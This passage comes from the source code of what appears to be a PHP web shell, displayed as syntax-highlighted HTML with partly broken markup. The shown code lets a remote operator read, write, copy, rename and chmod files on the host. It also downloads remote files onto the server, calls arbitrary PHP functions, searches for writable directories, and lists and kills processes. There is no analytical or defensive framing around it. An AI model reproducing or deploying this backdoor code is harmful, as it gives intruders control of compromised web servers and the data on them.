<span class="s1">        echo &quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=\&quot;Confirm\&quot;&amp;gt;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="s1">        echo &quot;&amp;lt;/form&amp;gt;&quot;;</span>
<span class="s1">      }</span>
<span class="s1">    }</span>
<span class="s1">     </span>
<span class="s1">    if ($act == &quot;phpfsys&quot;) {</span>
<span class="s1">      echo &quot;&amp;lt;div align=left&amp;gt;&quot;;</span>
<span class="s1">      $fsfunc = $phpfsysfunc;</span>
<span class="s1">      if ($fsfunc==&quot;copy&quot;) {</span>
<span class="s1">        if (!copy($arg1, $arg2)) { echo &quot;Failed to copy $arg1...\n&quot;;}</span>
<span class="s1">        else { echo &quot;&amp;lt;b&amp;gt;Success!&amp;lt;/b&amp;gt; $arg1 copied to $arg2\n&quot;; }</span>
<span class="s1">      }</span>
<span class="s1">      elseif ($fsfunc==&quot;rename&quot;) {</span>
<span class="s1">        if (!rename($arg1, $arg2)) { echo &quot;Failed to rename/move $arg1!\n&quot;;}</span>
<span class="s1">        else { echo &quot;&amp;lt;b&amp;gt;Success!&amp;lt;/b&amp;gt; $arg1 renamed/moved to $arg2\n&quot;; }</span>
<span class="s1">      }</span>
<span class="s1">      elseif ($fsfunc==&quot;chmod&quot;) {</span>
<span class="s1">        if (!chmod($arg1,$arg2)) { echo &quot;Failed to chmod $arg1!\n&quot;;}</span>
<span class="s1">        else { echo &quot;&amp;lt;b&amp;gt;Perm for $arg1 changed to $arg2!&amp;lt;/b&amp;gt;\n&quot;; }</span>
<span class="s1">      }</span>
<span class="s1">      elseif ($fsfunc==&quot;read&quot;) {</span>
<span class="s1">        $darg = $d.$arg1;</span>
<span class="s1">        if ($hasil = @file_get_contents($darg)) {</span>
<span class="s1">          echo &quot;&amp;lt;b&amp;gt;Filename:&amp;lt;/b&amp;gt; &quot;.$darg.&quot;&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1">          echo &quot;&amp;lt;center&amp;gt;&amp;lt;textarea cols=135 rows=30&amp;gt;&quot;;</span>
<span class="s1">          echo htmlentities($hasil);</span>
<span class="s1">          echo &quot;&amp;lt;/textarea&amp;gt;&amp;lt;/center&amp;gt;\n&quot;;</span>
<span class="s1">        }</span>
<span class="s1">        else { echo &quot;&amp;lt;div class=fxerrmsg&amp;gt; Couldn&#39;</span><span class="nx">t</span> <span class="nx">open</span> <span class="s2">&quot;.</span><span class="si">$darg</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; }</span>
<span class="s2">      }</span>
<span class="s2">      elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nx">write</span><span class="s2">&quot;) {</span>
<span class="s2">        </span><span class="si">$darg</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg1</span><span class="s2">;</span>
<span class="s2">        if(@file_put_contents(</span><span class="si">$darg</span><span class="s2">,</span><span class="si">$arg2</span><span class="s2">)) {</span>
<span class="s2">          echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Saved</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;.</span><span class="si">$darg</span><span class="s2">;</span>
<span class="s2">        }</span>
<span class="s2">        else { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="nx">fxerrmsg</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Can</span><span class="s1">&#39;t write to $darg!&amp;lt;/div&amp;gt;&quot;; }</span>
<span class="s1">      }</span>
<span class="s1">      elseif ($fsfunc==&quot;downloadbin&quot;) {</span>
<span class="s1">        $handle = fopen($arg1, &quot;rb&quot;);</span>
<span class="s1">        $contents = &#39;&#39;;</span>
<span class="s1">        while (!feof($handle)) {</span>
<span class="s1">          $contents .= fread($handle, 8192);</span>
<span class="s1">        }</span>
<span class="s1">        $r = @fopen($d.$arg2,&#39;</span><span class="nx">w</span><span class="s1">&#39;);</span>
<span class="s1">        if (fwrite($r,$contents)) { echo &quot;&amp;lt;b&amp;gt;Success!&amp;lt;/b&amp;gt; $arg1 saved to &quot;.$d.$arg2.&quot; (&quot;.view_size(filesize($d.$arg2)).&quot;)&quot;; }</span>
<span class="s1">        else { echo &quot;&amp;lt;div class=fxerrmsg&amp;gt;Can&#39;</span><span class="nx">t</span> <span class="nx">write</span> <span class="nx">to</span> <span class="s2">&quot;.</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">.&quot;</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">div</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; }</span>
<span class="s2">        fclose(</span><span class="si">$r</span><span class="s2">);</span>
<span class="s2">        fclose(</span><span class="si">$handle</span><span class="s2">);</span>
<span class="s2">      }</span>
<span class="s2">      elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nx">download</span><span class="s2">&quot;) {</span>
<span class="s2">        </span><span class="si">$text</span><span class="s2"> = implode(&#39;&#39;, file(</span><span class="si">$arg1</span><span class="s2">));</span>
<span class="s2">        if (</span><span class="si">$text</span><span class="s2">) {</span>
<span class="s2">          </span><span class="si">$r</span><span class="s2"> = @fopen(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">,&#39;w&#39;);</span>
<span class="s2">          if (fwrite(</span><span class="si">$r</span><span class="s2">,</span><span class="si">$text</span><span class="s2">)) { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Success</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$arg1</span> <span class="nx">saved</span> <span class="nx">to</span> <span class="s2">&quot;.</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">.&quot;</span> <span class="p">(</span><span class="s2">&quot;.view_size(filesize(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">)).&quot;</span><span class="p">)</span><span class="s2">&quot;; }</span>
<span class="s2">          else { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="nx">fxerrmsg</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Can</span><span class="s1">&#39;t write to &quot;.$d.$arg2.&quot;!&amp;lt;/div&amp;gt;&quot;; }</span>
<span class="s1">          fclose($r);</span>
<span class="s1">        }</span>
<span class="s1">        else { echo &quot;&amp;lt;div class=fxerrmsg&amp;gt;Can&#39;</span><span class="nx">t</span> <span class="nx">download</span> <span class="nx">from</span> <span class="nv">$arg1</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">div</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2">      }</span>
<span class="s2">      elseif (</span><span class="si">$fsfunc</span><span class="s2">==&#39;mkdir&#39;) {</span>
<span class="s2">        </span><span class="si">$thedir</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg1</span><span class="s2">;</span>
<span class="s2">        if (</span><span class="si">$thedir</span><span class="s2"> != </span><span class="si">$d</span><span class="s2">) {</span>
<span class="s2">          if (file_exists(</span><span class="si">$thedir</span><span class="s2">)) { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Already</span> <span class="nx">exists</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;.htmlspecialchars(</span><span class="si">$thedir</span><span class="s2">); }</span>
<span class="s2">          elseif (!mkdir(</span><span class="si">$thedir</span><span class="s2">)) { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Access</span> <span class="nx">denied</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;.htmlspecialchars(</span><span class="si">$thedir</span><span class="s2">); }</span>
<span class="s2">          else { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Dir</span> <span class="nx">created</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;.htmlspecialchars(</span><span class="si">$thedir</span><span class="s2">);}</span>
<span class="s2">        }</span>
<span class="s2">        else { echo &quot;</span><span class="nx">Can</span><span class="s1">&#39;t create current dir:&amp;lt;b&amp;gt; $thedir&amp;lt;/b&amp;gt;&quot;; }</span>
<span class="s1">      }</span>
<span class="s1">      elseif ($fsfunc==&#39;</span><span class="nx">fwritabledir</span><span class="s1">&#39;) {</span>
<span class="s1">        function recurse_dir($dir,$max_dir) {</span>
<span class="s1">          global $dir_count;</span>
<span class="s1">          $dir_count++;</span>
<span class="s1">          if( $cdir = dir($dir) ) {</span>
<span class="s1">            while( $entry = $cdir-&amp;gt; read() ) {</span>
<span class="s1">              if( $entry != &#39;</span><span class="o">.</span><span class="s1">&#39; &amp;&amp; $entry != &#39;</span><span class="o">..</span><span class="s1">&#39; ) {</span>
<span class="s1">                if(is_dir($dir.$entry) &amp;&amp; is_writable($dir.$entry) ) {</span>
<span class="s1">                 if ($dir_count &amp;gt; $max_dir) { return; }</span>
<span class="s1">                  echo &quot;[&quot;.$dir_count.&quot;] &quot;.$dir.$entry.&quot;\n&quot;;</span>
<span class="s1">                  recurse_dir($dir.$entry.DIRECTORY_SEPARATOR,$max_dir);</span>
<span class="s1">                }</span>
<span class="s1">              }</span>
<span class="s1">            }</span>
<span class="s1">            $cdir-&amp;gt;close();</span>
<span class="s1">          }</span>
<span class="s1">        }</span>
<span class="s1">        if (!$arg1) { $arg1 = $d; }</span>
<span class="s1">        if (!$arg2) { $arg2 = 10; }</span>
<span class="s1">        if (is_dir($arg1)) {</span>
<span class="s1">          echo &quot;&amp;lt;b&amp;gt;Writable directories (Max: $arg2) in:&amp;lt;/b&amp;gt; $arg1&amp;lt;hr noshade size=1&amp;gt;&quot;;</span>
<span class="s1">          echo &quot;&amp;lt;pre&amp;gt;&quot;;</span>
<span class="s1">          recurse_dir($arg1,$arg2);</span>
<span class="s1">          echo &quot;&amp;lt;/pre&amp;gt;&quot;;</span>
<span class="s1">          $total = $dir_count - 1;</span>
<span class="s1">          echo &quot;&amp;lt;hr noshade size=1&amp;gt;&amp;lt;b&amp;gt;Founds:&amp;lt;/b&amp;gt; &quot;.$total.&quot; of &amp;lt;b&amp;gt;Max&amp;lt;/b&amp;gt; $arg2&quot;;</span>
<span class="s1">        }</span>
<span class="s1">        else {</span>
<span class="s1">          echo &quot;&amp;lt;div class=fxerrmsg&amp;gt;Directory is not exist or permission denied!&amp;lt;/div&amp;gt;&quot;;</span>
<span class="s1">        }</span>
<span class="s1">      }</span>
<span class="s1">      else {</span>
<span class="s1">        if (!$arg1) { echo &quot;&amp;lt;div class=fxerrmsg&amp;gt;No operation! Please fill parameter [A]!&amp;lt;/div&amp;gt;\n&quot;; }</span>
<span class="s1">        else {</span>
<span class="s1">          if ($hasil = $fsfunc($arg1)) {</span>
<span class="s1">            echo &quot;&amp;lt;b&amp;gt;Result of $fsfunc $arg1:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1">            if (!is_array($hasil)) { echo &quot;$hasil\n&quot;; }</span>
<span class="s1">            else {</span>
<span class="s1">              echo &quot;&amp;lt;pre&amp;gt;&quot;;</span>
<span class="s1">              foreach ($hasil as $v) { echo $v.&quot;\n&quot;; }</span>
<span class="s1">              echo &quot;&amp;lt;/pre&amp;gt;&quot;;</span>
<span class="s1">            }</span>
<span class="s1">          }</span>
<span class="s1">          else { echo &quot;&amp;lt;div class=fxerrmsg&amp;gt;$fsfunc $arg1 failed!&amp;lt;/div&amp;gt;\n&quot;; }</span>
<span class="s1">        }</span>
<span class="s1">      }</span>
<span class="s1">      echo &quot;&amp;lt;/div&amp;gt;\n&quot;;</span>
<span class="s1">    }</span>
<span class="s1">    if ($act == &quot;processes&quot;) {</span>
<span class="s1">      echo &quot;&amp;lt;div class=barheader&amp;gt;.: Processes :.&amp;lt;/div&amp;gt;\n&quot;;</span>
<span class="s1">      if (!$win) { $handler = &quot;ps aux&quot;.($grep?&quot; | grep &#39;</span><span class="s2">&quot;.addslashes(</span><span class="si">$grep</span><span class="s2">).&quot;</span><span class="s1">&#39;&quot;:&quot;&quot;); }</span>
<span class="s1">      else { $handler = &quot;tasklist&quot;; }</span>
<span class="s1">      $ret = tpexec($handler);</span>
<span class="s1">      if (!$ret) { echo &quot;Can&#39;</span><span class="nx">t</span> <span class="nx">execute</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$handler</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$processes_sort</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$processes_sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;</span> <span class="p">}</span>
        <span class="nv">$parsesort</span> <span class="o">=</span> <span class="nx">parsesort</span><span class="p">(</span><span class="nv">$processes_sort</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
        <span class="nv">$k</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_desc</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_asc</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">9</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">14</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//Not Windows</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sig</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span> <span class="p">}</span>
            <span class="k">echo</span> <span class="s2">&quot;Sending signal &quot;</span><span class="o">.</span><span class="nv">$sig</span><span class="o">.</span><span class="s2">&quot; to #&quot;</span><span class="o">.</span><span class="nv">$pid</span><span class="o">.</span><span class="s2">&quot;... &quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">posix_kill</span><span class="p">(</span><span class="nv">$pid</span><span class="p">,</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;OK.&quot;</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;ERROR.&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="p">}</span>
          <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
          <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
          <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
          <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
              <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
              <span class="nv">$line</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
              <span class="nv">$line</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">get_current_user</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
              <span class="nv">$line</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;pid=&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;sig=9</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;KILL&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
              <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
       
        <span class="k">else</span> <span class="p">{</span>
          <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
          <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
          <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
          <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
          <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$stack</span><span class="p">);</span>
          <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Image Name&quot;</span><span class="p">,</span><span class="s2">&quot;ImageName&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Session Name&quot;</span><span class="p">,</span><span class="s2">&quot;SessionName&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Mem Usage&quot;</span><span class="p">,</span><span class="s2">&quot;MemoryUsage&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$stack</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
          <span class="nv">$head</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_desc</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
